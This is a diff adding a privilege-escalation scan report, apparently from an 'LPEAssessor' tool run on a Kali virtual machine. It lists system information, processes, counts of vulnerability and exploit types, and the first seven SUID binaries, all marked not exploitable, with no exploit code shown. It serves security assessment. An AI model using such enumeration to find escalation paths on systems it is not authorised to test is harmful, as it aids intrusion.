@@ -1,0 +1,1095 @@
+================================================================================
+Advanced Linux Privilege Escalation Report
+Scan Time: 2025-03-17 08:15:46
+================================================================================
+
+SYSTEM INFORMATION
+--------------------------------------------------------------------------------
+Hostname: kali
+Os: Linux
+Kernel Version: 6.11.2-amd64
+Architecture: x86_64
+Current User: kali
+User Id: 1000
+Group Id: 1000
+Groups:
+  adm
+  dialout
+  cdrom
+  floppy
+  sudo
+  audio
+  dip
+  video
+  plugdev
+  users
+  netdev
+  bluetooth
+  scanner
+  lpadmin
+  wireshark
+  kaboxer
+  vboxsf
+System Users:
+  root
+  daemon
+  bin
+  sys
+  sync
+  games
+  man
+  lp
+  mail
+  news
+  uucp
+  proxy
+  www-data
+  backup
+  list
+  irc
+  _apt
+  nobody
+  systemd-network
+  dhcpcd
+  systemd-timesync
+  messagebus
+  tss
+  strongswan
+  tcpdump
+  sshd
+  dnsmasq
+  avahi
+  nm-openvpn
+  speech-dispatcher
+  usbmux
+  pulse
+  nm-openconnect
+  lightdm
+  saned
+  polkitd
+  rtkit
+  colord
+  _galera
+  mysql
+  stunnel4
+  _rpc
+  geoclue
+  Debian-snmp
+  sslh
+  ntpsec
+  cups-pk-helper
+  redsocks
+  _gophish
+  iodine
+  miredo
+  statd
+  redis
+  postgres
+  mosquitto
+  inetsim
+  _gvm
+  kali
+  test
+Environment:
+  COLORFGBG: 15;0
+  COLORTERM: truecolor
+  COMMAND_NOT_FOUND_INSTALL_PROMPT: 1
+  DBUS_SESSION_BUS_ADDRESS: unix:path=/run/user/1000/bus
+  DESKTOP_SESSION: lightdm-xsession
+  DISPLAY: :0.0
+  DOTNET_CLI_TELEMETRY_OPTOUT: 1
+  GDMSESSION: lightdm-xsession
+  HOME: /home/kali
+  LANG: en_US.UTF-8
+  LOGNAME: kali
+  PATH: /home/kali/.local/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kali/.dotnet/tools
+  POWERSHELL_TELEMETRY_OPTOUT: 1
+  POWERSHELL_UPDATECHECK: Off
+  PWD: /home/kali/LPEAssessor
+  QT_ACCESSIBILITY: 1
+  QT_AUTO_SCREEN_SCALE_FACTOR: 0
+  QT_QPA_PLATFORMTHEME: qt5ct
+  SESSION_MANAGER: local/kali:@/tmp/.ICE-unix/882,unix/kali:/tmp/.ICE-unix/882
+  SHELL: /usr/bin/zsh
+  SHLVL: 1
+  SSH_AGENT_PID: 1019
+  SSH_AUTH_SOCK: /tmp/ssh-mhPga1oNQAkZ/agent.1018
+  TERM: xterm-256color
+  USER: kali
+  WINDOWID: 0
+  XAUTHORITY: /home/kali/.Xauthority
+  XDG_CACHE_HOME: /home/kali/.cache
+  XDG_CONFIG_DIRS: /etc/xdg
+  XDG_CONFIG_HOME: /home/kali/.config
+  XDG_CURRENT_DESKTOP: XFCE
+  XDG_DATA_DIRS: /usr/share/xfce4:/usr/local/share/:/usr/share/:/usr/share
+  XDG_GREETER_DATA_DIR: /var/lib/lightdm/data/kali
+  XDG_MENU_PREFIX: xfce-
+  XDG_RUNTIME_DIR: /run/user/1000
+  XDG_SEAT: seat0
+  XDG_SEAT_PATH: /org/freedesktop/DisplayManager/Seat0
+  XDG_SESSION_CLASS: user
+  XDG_SESSION_DESKTOP: lightdm-xsession
+  XDG_SESSION_ID: 2
+  XDG_SESSION_PATH: /org/freedesktop/DisplayManager/Session0
+  XDG_SESSION_TYPE: x11
+  XDG_VTNR: 7
+  _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+  OLDPWD: /home/kali/LPEAssessor
+  LS_COLORS: rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.7z=01;31:*.ace=01;31:*.alz=01;31:*.apk=01;31:*.arc=01;31:*.arj=01;31:*.bz=01;31:*.bz2=01;31:*.cab=01;31:*.cpio=01;31:*.crate=01;31:*.deb=01;31:*.drpm=01;31:*.dwm=01;31:*.dz=01;31:*.ear=01;31:*.egg=01;31:*.esd=01;31:*.gz=01;31:*.jar=01;31:*.lha=01;31:*.lrz=01;31:*.lz=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.lzo=01;31:*.pyz=01;31:*.rar=01;31:*.rpm=01;31:*.rz=01;31:*.sar=01;31:*.swm=01;31:*.t7z=01;31:*.tar=01;31:*.taz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tgz=01;31:*.tlz=01;31:*.txz=01;31:*.tz=01;31:*.tzo=01;31:*.tzst=01;31:*.udeb=01;31:*.war=01;31:*.whl=01;31:*.wim=01;31:*.xz=01;31:*.z=01;31:*.zip=01;31:*.zoo=01;31:*.zst=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.crdownload=00;90:*.dpkg-dist=00;90:*.dpkg-new=00;90:*.dpkg-old=00;90:*.dpkg-tmp=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:*.swp=00;90:*.tmp=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90::ow=30;44:
+  LESS_TERMCAP_mb: [1;31m
+  LESS_TERMCAP_md: [1;36m
+  LESS_TERMCAP_me: [0m
+  LESS_TERMCAP_so: [01;33m
+  LESS_TERMCAP_se: [0m
+  LESS_TERMCAP_us: [1;32m
+  LESS_TERMCAP_ue: [0m
+  _: /usr/bin/python3
+Disk Space:
+  Filesystem      Size  Used Avail Use% Mounted on
+  udev            926M     0  926M   0% /dev
+  tmpfs           198M  988K  197M   1% /run
+  /dev/sda1        79G   16G   60G  21% /
+  tmpfs           988M  4.0K  988M   1% /dev/shm
+  tmpfs           5.0M     0  5.0M   0% /run/lock
+  tmpfs           1.0M     0  1.0M   0% /run/credentials/systemd-udev-load-credentials.service
+  tmpfs           1.0M     0  1.0M   0% /run/credentials/systemd-tmpfiles-setup-dev-early.service
+  tmpfs           1.0M     0  1.0M   0% /run/credentials/systemd-sysctl.service
+  tmpfs           1.0M     0  1.0M   0% /run/credentials/systemd-tmpfiles-setup-dev.service
+  tmpfs           988M  3.0M  985M   1% /tmp
+  tmpfs           1.0M     0  1.0M   0% /run/credentials/systemd-tmpfiles-setup.service
+  tmpfs           1.0M     0  1.0M   0% /run/credentials/getty@tty1.service
+  tmpfs           198M  128K  198M   1% /run/user/1000
+  tmpfs           1.0M     0  1.0M   0% /run/credentials/systemd-journald.service
+Network Interfaces:
+  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+      inet 127.0.0.1/8 scope host lo
+         valid_lft forever preferred_lft forever
+      inet6 ::1/128 scope host noprefixroute 
+         valid_lft forever preferred_lft forever
+  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+      link/ether 08:00:27:6e:13:6e brd ff:ff:ff:ff:ff:ff
+      inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
+         valid_lft 86012sec preferred_lft 86012sec
+      inet6 fe80::26d3:dd05:fe3:e8ce/64 scope link noprefixroute 
+         valid_lft forever preferred_lft forever
+Listening Ports:
+  Active Internet connections (only servers)
+  Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+Running Processes:
+  USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+  root           1  0.0  0.6  22856 12884 ?        Ss   Mar16   0:03 /sbin/init splash
+  root           2  0.0  0.0      0     0 ?        S    Mar16   0:00 [kthreadd]
+  root           3  0.0  0.0      0     0 ?        S    Mar16   0:00 [pool_workqueue_release]
+  root           4  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-rcu_gp]
+  root           5  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-sync_wq]
+  root           6  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-slub_flushwq]
+  root           7  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-netns]
+  root          12  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-mm_percpu_wq]
+  root          13  0.0  0.0      0     0 ?        I    Mar16   0:00 [rcu_tasks_kthread]
+  root          14  0.0  0.0      0     0 ?        I    Mar16   0:00 [rcu_tasks_rude_kthread]
+  root          15  0.0  0.0      0     0 ?        I    Mar16   0:00 [rcu_tasks_trace_kthread]
+  root          16  0.0  0.0      0     0 ?        S    Mar16   0:03 [ksoftirqd/0]
+  root          17  0.0  0.0      0     0 ?        I    Mar16   0:12 [rcu_preempt]
+  root          18  0.0  0.0      0     0 ?        S    Mar16   0:00 [rcu_exp_par_gp_kthread_worker/0]
+  root          19  0.0  0.0      0     0 ?        S    Mar16   0:00 [rcu_exp_gp_kthread_worker]
+  root          20  0.0  0.0      0     0 ?        S    Mar16   0:00 [migration/0]
+  root          21  0.0  0.0      0     0 ?        S    Mar16   0:00 [idle_inject/0]
+  root          22  0.0  0.0      0     0 ?        S    Mar16   0:00 [cpuhp/0]
+  root          23  0.0  0.0      0     0 ?        S    Mar16   0:00 [cpuhp/1]
+  root          24  0.0  0.0      0     0 ?        S    Mar16   0:00 [idle_inject/1]
+  root          25  0.0  0.0      0     0 ?        S    Mar16   0:00 [migration/1]
+  root          26  0.0  0.0      0     0 ?        S    Mar16   0:04 [ksoftirqd/1]
+  root          32  0.0  0.0      0     0 ?        I    Mar16   0:00 [kworker/u10:1-flush-8:0]
+  root          33  0.0  0.0      0     0 ?        S    Mar16   0:00 [kdevtmpfs]
+  root          34  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-inet_frag_wq]
+  root          35  0.0  0.0      0     0 ?        S    Mar16   0:00 [kauditd]
+  root          37  0.0  0.0      0     0 ?        S    Mar16   0:00 [khungtaskd]
+  root          38  0.0  0.0      0     0 ?        S    Mar16   0:00 [oom_reaper]
+  root          39  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-writeback]
+  root          40  0.0  0.0      0     0 ?        S    Mar16   0:05 [kcompactd0]
+  root          41  0.0  0.0      0     0 ?        SN   Mar16   0:00 [ksmd]
+  root          42  0.0  0.0      0     0 ?        SN   Mar16   0:01 [khugepaged]
+  root          43  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-kintegrityd]
+  root          44  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-kblockd]
+  root          45  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-blkcg_punt_bio]
+  root          46  0.0  0.0      0     0 ?        S    Mar16   0:00 [irq/9-acpi]
+  root          48  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-tpm_dev_wq]
+  root          49  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-edac-poller]
+  root          50  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-devfreq_wq]
+  root          52  0.0  0.0      0     0 ?        S    Mar16   0:05 [kswapd0]
+  root          59  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-kthrotld]
+  root          63  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-acpi_thermal_pm]
+  root          65  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-mld]
+  root          67  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-ipv6_addrconf]
+  root          69  0.0  0.0      0     0 ?        I    Mar16   0:00 [kworker/u8:1-ipv6_addrconf]
+  root          73  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-kstrp]
+  root          77  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/u11:0]
+  root          78  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/u12:0-ttm]
+  root          79  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/u13:0]
+  root          84  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-cryptd]
+  root         214  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-ata_sff]
+  root         215  0.0  0.0      0     0 ?        S    Mar16   0:00 [scsi_eh_0]
+  root         216  0.0  0.0      0     0 ?        S    Mar16   0:00 [scsi_eh_1]
+  root         217  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-scsi_tmf_1]
+  root         219  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-scsi_tmf_0]
+  root         220  0.0  0.0      0     0 ?        S    Mar16   0:00 [scsi_eh_2]
+  root         221  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-scsi_tmf_2]
+  root         234  0.0  0.0      0     0 ?        S    Mar16   0:00 [irq/18-vmwgfx]
+  root         236  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-ttm]
+  root         281  0.0  0.0      0     0 ?        S    Mar16   0:00 [jbd2/sda1-8]
+  root         282  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-ext4-rsv-conversion]
+  root         385  0.0  0.3  29988  7832 ?        Ss   Mar16   0:00 /usr/lib/systemd/systemd-udevd
+  root         393  0.0  0.0      0     0 ?        S    Mar16   0:00 [psimon]
+  root         500  0.0  0.1   8368  2416 ?        Ss   Mar16   0:00 /usr/sbin/haveged --Foreground --verbose=1
+  root         516  0.0  0.3 308632  7084 ?        Ssl  Mar16   0:00 /usr/libexec/accounts-daemon
+  message+     517  0.0  0.2   8720  4872 ?        Ss   Mar16   0:03 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  polkitd      519  0.0  0.4 382376  9592 ?        Ssl  Mar16   0:00 /usr/lib/polkit-1/polkitd --no-debug --log-level=err
+  root         520  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-rpciod]
+  root         521  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/R-xprtiod]
+  root         537  0.0  0.1   6772  2664 ?        Ss   Mar16   0:00 /usr/sbin/cron -f
+  root         572  0.0  0.7 333696 14964 ?        Ssl  Mar16   0:02 /usr/sbin/NetworkManager --no-daemon
+  root         600  0.0  0.4 389980  8348 ?        Ssl  Mar16   0:00 /usr/sbin/ModemManager
+  root         628  0.0  0.1 356084  2460 ?        Sl   Mar16   0:06 /usr/sbin/VBoxService
+  root         648  0.0  0.0      0     0 ?        I    Mar16   0:00 [kworker/u8:2]
+  root         694  0.0  0.3 380936  6576 ?        SLsl Mar16   0:00 /usr/sbin/lightdm
+  root         706  0.1  6.3 451712 127688 tty7    Ssl+ Mar16   2:05 /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
+  root         707  0.0  0.0   6996  1756 tty1     Ss+  Mar16   0:00 /sbin/agetty -o -p -- \u --noclear - linux
+  root         734  0.0  0.0      0     0 ?        S    Mar16   0:00 [psimon]
+  rtkit        760  0.0  0.1  85868  2732 ?        SNsl Mar16   0:02 /usr/libexec/rtkit-daemon
+  root         831  0.0  0.3 237004  7708 ?        Sl   Mar16   0:00 lightdm --session-child 13 24
+  kali         839  0.0  0.5  21352 11256 ?        Ss   Mar16   0:00 /usr/lib/systemd/systemd --user
+  kali         840  0.0  0.1  22632  2636 ?        S    Mar16   0:00 (sd-pam)
+  kali         857  0.0  0.3 109676  7668 ?        Ssl  Mar16   0:00 /usr/bin/pipewire
+  kali         859  0.0  0.1  84336  3060 ?        Ssl  Mar16   0:00 /usr/bin/pipewire -c filter-chain.conf
+  kali         860  0.0  0.9 643504 19448 ?        Ssl  Mar16   0:00 /usr/bin/wireplumber
+  kali         862  0.0  0.3  98740  6424 ?        Ssl  Mar16   0:00 /usr/bin/pipewire-pulse
+  kali         863  0.0  0.3 313832  6848 ?        SLsl Mar16   0:00 /usr/bin/gnome-keyring-daemon --foreground --components=pkcs11,secrets --control-directory=/run/user/1000/keyring
+  kali         864  0.0  0.2   7740  4236 ?        Ss   Mar16   0:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  kali         882  0.0  0.7 337132 15460 ?        Ssl  Mar16   0:00 xfce4-session
+  kali         946  0.0  0.0  17260  1132 ?        S    Mar16   0:00 /usr/bin/VBoxClient --clipboard
+  kali         948  0.0  0.2 215976  4280 ?        Sl   Mar16   0:00 /usr/bin/VBoxClient --clipboard
+  kali         961  0.0  0.0  17260  1424 ?        S    Mar16   0:00 /usr/bin/VBoxClient --seamless
+  kali         962  0.0  0.1 215548  2692 ?        Sl   Mar16   0:11 /usr/bin/VBoxClient --seamless
+  kali         969  0.0  0.0  17260  1192 ?        S    Mar16   0:00 /usr/bin/VBoxClient --draganddrop
+  kali         970  0.0  0.1 216064  2476 ?        Sl   Mar16   0:45 /usr/bin/VBoxClient --draganddrop
+  kali         993  0.0  0.3 380912  6604 ?        Ssl  Mar16   0:00 /usr/libexec/at-spi-bus-launcher
+  kali        1000  0.0  0.1   7352  3752 ?        S    Mar16   0:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 11 --address=unix:path=/run/user/1000/at-spi/bus_0
+  kali        1011  0.0  0.3 234048  6704 ?        Sl   Mar16   0:01 /usr/libexec/at-spi2-registryd --use-gnome-session
+  kali        1019  0.0  0.0   9916   620 ?        Ss   Mar16   0:00 /usr/bin/ssh-agent -s
+  kali        1027  0.0  0.1  81676  2960 ?        SLs  Mar16   0:00 /usr/bin/gpg-agent --supervised
+  kali        1029  0.0  3.1 983212 64344 ?        Sl   Mar16   0:40 xfwm4
+  kali        1033  0.0  0.3 312480  6860 ?        Ssl  Mar16   0:00 /usr/libexec/gvfsd
+  kali        1039  0.0  0.3 457552  6556 ?        Sl   Mar16   0:00 /usr/libexec/gvfsd-fuse /run/user/1000/gvfs -f
+  kali        1055  0.0  0.7 302100 16168 ?        Sl   Mar16   0:01 xfsettingsd
+  kali        1063  0.0  0.0  17260  1400 ?        S    Mar16   0:00 /usr/bin/VBoxClient --vmsvga
+  kali        1064  0.0  0.1 215652  2684 ?        Sl   Mar16   0:03 /usr/bin/VBoxClient --vmsvga
+  root        1068  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/u12:1]
+  kali        1069  0.0  1.1 535540 22324 ?        Sl   Mar16   0:02 xfce4-panel
+  kali        1074  0.0  1.8 541508 36804 ?        Sl   Mar16   0:02 Thunar --daemon
+  kali        1079  0.0  1.1 558880 23040 ?        Sl   Mar16   0:03 xfdesktop
+  kali        1083  0.0  0.8 460376 17408 ?        Sl   Mar16   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libwhiskermenu.so 1 27262983 whiskermenu Whisker Menu Show a menu to easily access installed applications
+  kali        1087  0.0  0.7 286364 15904 ?        Sl   Mar16   0:50 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libcpugraph.so 13 27262988 cpugraph CPU Graph Graphical representation of the CPU load
+  kali        1088  0.0  0.6 409820 13564 ?        Sl   Mar16   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libsystray.so 14 27262989 systray Status Tray Plugin Provides status notifier items (application indicators) and legacy systray items
+  kali        1089  0.0  0.7 338100 14928 ?        Sl   Mar16   0:52 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libgenmon.so 15 27262990 genmon Generic Monitor Show output of a command.
+  kali        1090  0.0  0.8 459232 16876 ?        Sl   Mar16   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libpulseaudio-plugin.so 16 27262991 pulseaudio PulseAudio Plugin Adjust the audio volume of the PulseAudio sound system
+  kali        1091  0.0  0.8 459096 17892 ?        Sl   Mar16   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libnotification-plugin.so 17 27262992 notification-plugin Notification Plugin Notification plugin for the Xfce panel
+  kali        1092  0.0  0.9 385936 19972 ?        Sl   Mar16   0:01 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libxfce4powermanager.so 18 27262993 power-manager-plugin Power Manager Plugin Display the battery levels of your devices and control the brightness of your display
+  kali        1100  0.0  0.6 385768 13676 ?        Sl   Mar16   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libactions.so 22 27262994 actions Action Buttons Log out, lock or other system actions
+  kali        1132  0.0  1.8 461560 37876 ?        Ssl  Mar16   0:03 /usr/lib/x86_64-linux-gnu/xfce4/notifyd/xfce4-notifyd
+  root        1133  0.0  0.3 317620  8012 ?        Ssl  Mar16   0:01 /usr/libexec/upowerd
+  kali        1149  0.0  0.5 256228 10216 ?        Sl   Mar16   0:00 /usr/libexec/polkit-mate-authentication-agent-1
+  kali        1151  0.0  0.3 922648  6532 ?        Sl   Mar16   0:00 xiccd
+  kali        1152  0.0  0.6 262380 12496 ?        Sl   Mar16   0:00 xfce4-power-manager
+  colord      1158  0.0  0.5 315620 11668 ?        Ssl  Mar16   0:00 /usr/libexec/colord
+  kali        1159  0.0  0.5  64044 11992 ?        S    Mar16   0:00 /usr/bin/python3 /usr/share/system-config-printer/applet.py
+  kali        1169  0.0  1.0 411588 21632 ?        Sl   Mar16   0:00 light-locker
+  kali        1177  0.0  0.2 230560  5704 ?        Ssl  Mar16   0:00 /usr/libexec/dconf-service
+  kali        1183  0.0  0.8 526856 16844 ?        Sl   Mar16   0:00 /usr/bin/python3 /usr/bin/blueman-applet
+  kali        1191  0.0  0.2 308172  5728 ?        Sl   Mar16   0:00 /usr/libexec/geoclue-2.0/demos/agent
+  kali        1216  0.1  1.2 621724 24324 ?        Sl   Mar16   2:06 nm-applet
+  kali        1250  0.0  0.4 425900  8504 ?        Ssl  Mar16   0:00 /usr/libexec/gvfs-udisks2-volume-monitor
+  root        1258  0.0  0.4 469108  8236 ?        Ssl  Mar16   0:00 /usr/libexec/udisks2/udisksd
+  kali        1309  0.0  0.3 308664  6284 ?        Ssl  Mar16   0:00 /usr/libexec/gvfs-gphoto2-volume-monitor
+  kali        1314  0.0  0.3 389044  7040 ?        Ssl  Mar16   0:00 /usr/libexec/gvfs-afc-volume-monitor
+  kali        1320  0.0  0.2 307612  5752 ?        Ssl  Mar16   0:00 /usr/libexec/gvfs-goa-volume-monitor
+  kali        1325  0.0  0.2 307708  5956 ?        Ssl  Mar16   0:00 /usr/libexec/gvfs-mtp-volume-monitor
+  kali        1338  0.0  0.3 533952  7536 ?        Sl   Mar16   0:00 /usr/libexec/gvfsd-trash --spawner :1.22 /org/gtk/gvfs/exec_spaw/0
+  kali        1348  0.0  0.2 234188  5868 ?        Ssl  Mar16   0:00 /usr/libexec/gvfsd-metadata
+  kali        1353  0.0  0.1  46384  3280 ?        Ss   Mar16   0:00 /usr/libexec/bluetooth/obexd
+  root        1435  0.0  0.0      0     0 ?        I    Mar16   0:00 [kworker/u10:4-flush-8:0]
+  kali        1494  0.0  2.8 462444 57384 ?        Sl   Mar16   0:07 /usr/bin/qterminal
+  kali        1497  0.0  0.2  10376  5192 pts/0    Ss   Mar16   0:00 /usr/bin/zsh
+  kali        4543  0.0  0.8 627328 17948 ?        Ssl  Mar16   0:00 /usr/libexec/xdg-desktop-portal
+  kali        4563  0.0  0.3 680612  6804 ?        Ssl  Mar16   0:00 /usr/libexec/xdg-document-portal
+  kali        4571  0.0  0.3 308328  6376 ?        Ssl  Mar16   0:00 /usr/libexec/xdg-permission-store
+  root        4585  0.0  0.0   2576  1840 ?        Ss   Mar16   0:00 fusermount3 -o rw,nosuid,nodev,fsname=portal,auto_unmount,subtype=portal -- /run/user/1000/doc
+  kali        4589  0.0  0.9 406192 18876 ?        Ssl  Mar16   0:00 /usr/libexec/xdg-desktop-portal-gtk
+  root       28664  0.0  0.0      0     0 ?        I    Mar16   0:00 [kworker/1:1-cgroup_destroy]
+  root       37889  0.0  0.0      0     0 ?        I    Mar16   0:05 [kworker/0:0-events]
+  root       42874  0.0  0.0      0     0 ?        I<   Mar16   0:00 [kworker/1:2H]
+  root       44435  0.0  0.0      0     0 ?        I    Mar16   0:00 [kworker/u9:2-events_unbound]
+  root       44460  0.0  0.4  17840  8668 ?        Ss   Mar16   0:00 /usr/lib/systemd/systemd-logind
+  root       46192  0.0  0.6  41556 13976 ?        Ss   07:58   0:00 /usr/lib/systemd/systemd-journald
+  root       46360  0.0  0.0      0     0 ?        I    07:58   0:00 [kworker/0:2-ata_sff]
+  root       46387  0.0  0.0      0     0 ?        I<   07:58   0:00 [kworker/0:0H-kblockd]
+  root       46596  0.0  0.0      0     0 ?        I    07:59   0:00 [kworker/u9:3-flush-8:0]
+  root       46597  0.0  0.0      0     0 ?        I<   07:59   0:00 [kworker/1:0H-kblockd]
+  root       49295  0.0  0.0      0     0 ?        I    08:04   0:00 [kworker/u9:0-events_unbound]
+  root       49683  0.0  0.0      0     0 ?        I    08:05   0:00 [kworker/u9:1-flush-8:0]
+  root       50690  0.0  0.0      0     0 ?        I<   08:07   0:00 [kworker/0:2H-kblockd]
+  root       50694  0.0  0.0      0     0 ?        I    08:07   0:00 [kworker/u10:2-flush-8:0]
+  root       50698  0.0  0.0      0     0 ?        I    08:07   0:00 [kworker/1:2-events]
+  root       53077  0.0  0.0      0     0 ?        I    08:12   0:00 [kworker/0:1]
+  kali       53263  0.0  0.3 307372  6320 ?        Sl   08:12   0:00 /usr/lib/x86_64-linux-gnu/xfce4/xfconf/xfconfd
+  root       53276  0.0  0.0      0     0 ?        I    08:12   0:00 [kworker/u10:0-events_unbound]
+  root       53345  0.0  0.0      0     0 ?        I    08:12   0:00 [kworker/1:0-cgroup_destroy]
+  kali       53355  0.1  1.3 648796 27808 ?        SNsl 08:12   0:00 /usr/lib/x86_64-linux-gnu/tumbler-1/tumblerd
+  kali       53863 55.5  1.1  30440 22740 pts/0    S+   08:13   0:00 python3 LPEAssessor.py -o reportTXT -f text
+  kali       53867  0.0  0.1   8388  3868 pts/0    R+   08:13   0:00 ps aux
+
+SUMMARY
+--------------------------------------------------------------------------------
+Total Vulnerabilities: 63
+Total Exploits: 23
+
+Vulnerability Types:
+  Suid Binary: 36
+  Sgid Binary: 11
+  World Writable Directory: 2
+  Plaintext Credentials: 10
+  Writable Path Directory: 1
+  Path Hijacking: 2
+  History File Exposure: 1
+
+Exploit Types:
+  Suid Binary: 1
+  Path Hijacking: 5
+  Plaintext Credentials: 10
+  Path Hijacking Bash Copy: 2
+  Path Hijacking Add User: 2
+  Path Hijacking Sudo Exploit: 2
+  History File Exposure: 1
+
+VULNERABILITIES DETAILS
+--------------------------------------------------------------------------------
+[1] Suid Binary
+  Path: /etc/alternatives/rsh
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[2] Suid Binary
+  Path: /etc/alternatives/rlogin
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[3] Suid Binary
+  Path: /usr/lib/chromium/chrome-sandbox
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[4] Suid Binary
+  Path: /usr/lib/openssh/ssh-keysign
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[5] Suid Binary
+  Path: /usr/lib/polkit-1/polkit-agent-helper-1
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[6] Suid Binary
+  Path: /usr/lib/policykit-1/polkit-agent-helper-1
+  Owner: root
+  Group: root
+  Permissions: 4755
+  Exploit Method: 
+  Is Exploitable: False
+
+[7] Suid Binary
+  Path: /usr/lib/xorg/Xorg.wrap
+  Owner: root
+  Group: root
+  Permissions: 6755
+  Exploit Method: 
+  Is Exploitable: False
+
